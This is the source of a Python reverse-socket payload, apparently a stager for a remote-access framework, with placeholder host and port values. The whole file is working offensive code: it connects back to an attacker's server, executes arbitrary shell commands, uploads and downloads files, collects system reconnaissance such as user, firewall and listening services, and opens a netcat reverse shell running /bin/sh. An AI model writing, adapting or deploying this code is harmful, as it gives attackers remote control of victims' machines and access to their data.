# Reverse Socket TCP Payload
# Author: @screamz2k

import base64
import importlib
import json
import os
import platform
import socket
import ssl
import subprocess as sp
import time

# list of the modules you have to install manually
imports = ["cryptography"]
try:
    for i in imports:
        globals()[i] = importlib.import_module(i)
except:
    for i in imports:
        sp.call(["pip3", "install", i])
    try:
        for i in imports:
            globals()[i] = importlib.import_module(i)
    except:
        print("Couldn't execute the Stager.")
        print("Please install the required modules manually.")
        exit(1)
# Manually
from cryptography.fernet import Fernet

fernet = ""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def decrypt(data):
    return fernet.decrypt(data).decode()


def encrypt(data):
    return fernet.encrypt(data.encode())


for i in range(1, TIMEOUT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if SSL:
            cert = ssl.get_server_certificate((HOST, PORT), ssl_version=ssl.PROTOCOL_TLS_CLIENT)
            with open("/tmp/cert.pem", "w") as f:
                f.write(cert)
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.load_verify_locations("/tmp/cert.pem")
            s = context.wrap_socket(s, server_hostname=HOST)
        s.connect((HOST, PORT))
    except socket.error as e:
        print(e)
        print("Trying to connect")
        time.sleep(1)
        continue
    print("Connected to Server")
    key = s.recv(1024)
    fernet = Fernet(key)
    s.send(encrypt(platform.system()))
    while True:
        try:
            data = decrypt(s.recv(1024))
        except KeyboardInterrupt:
            s.close()
            exit(0)
        except:
            break
        data = data.split(":")
        option = data[0]
        args = data[1:]
        option = option.lower()
        if option == "cmd":
            s.send(encrypt(sp.getoutput(args)))
        elif option == "check":
            s.send(encrypt("1"))
        elif option == "file-u":
            try:
                file = s.recv(1024)
                with open(data[0], "wb") as f:
                    f.write(file)
                s.send(encrypt("File Uploaded"))
            except Exception as e:
                s.send(encrypt("!" + str(e)))
        elif option == "file-d":
            try:
                with open(args, "rb") as f:
                    s.send(len(f.read()))
                    s.sendfile(f)
            except Exception as e:
                s.send(encrypt("!" + str(e)))
        elif option == "content":
            try:
                with open(args) as f:
                    s.send(encrypt(f.read()))
            except Exception as e:
                s.send(encrypt("!" + str(e)))
        elif option == "infos":
            # Get System Infos
            infos = {}
            infos["hostname"] = sp.getoutput("hostname")
            infos["operating_system"] = sp.getoutput("uname -a")
            infos["user"] = sp.getoutput("whoami")
            infos["python_version"] = sp.getoutput("python3 -V")
            infos["date"] = sp.getoutput("date")
            infos["firewall"] = sp.getoutput("ufw status")
            infos["sudo"] = sp.getoutput("sudo -V")
            infos["services"] = sp.getoutput("ss -tulpn")
            s.send(encrypt(base64.b64encode(json.dumps(infos).encode())))
        elif option == "dir":
            try:
                os.listdir(args)
                s.send(encrypt(str(os.listdir())))
            except Exception as e:
                s.send(encrypt("!" + str(e)))
        elif option == "exit":
            # Cleanup
            exit()
        elif option == "shell":
            sp.Popen(["nc", args[0], args[1], "-e /bin/sh"])
            s.send(encrypt("Shell Opened"))
